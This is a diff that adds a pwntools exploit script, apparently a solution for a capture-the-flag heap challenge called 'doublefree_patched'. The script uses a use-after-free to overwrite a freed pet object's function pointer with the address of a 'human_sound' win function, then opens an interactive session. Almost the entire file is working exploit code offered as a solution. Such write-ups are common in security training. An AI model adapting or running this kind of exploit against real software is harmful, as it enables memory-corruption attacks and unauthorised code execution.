@@ -1,0 +1,36 @@
+from pwn import *
+
+# only use after free, unintended sol
+
+p = process("./doublefree_patched")
+'''
+p = gdb.debug("./doublefree_patched", gdbscript = 
+b *add_pet + 192
+b *remove_pet
+b *play_sound
+)
+'''
+e = ELF("./doublefree_patched")
+libc = ELF("./libc-2.31.so")
+
+win = e.symbols['human_sound']
+
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"Index: ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"Name: ", b"AAAAAAAA")
+p.sendlineafter(b"Age: ", b"16")
+
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"Index: ", b"1")
+
+p.sendlineafter(b"> ", b"5")
+p.sendlineafter(b"Index: ", b"5")
+payload = b"A" * 8 + p64(win) + b"B" * 8
+p.sendlineafter(b"feedback: ", payload)
+p.sendlineafter(b"(y/n): ", b"n")
+
+p.sendlineafter(b"> ", b"4")
+p.sendlineafter(b"Index: ", b"1")
+
+p.interactive()
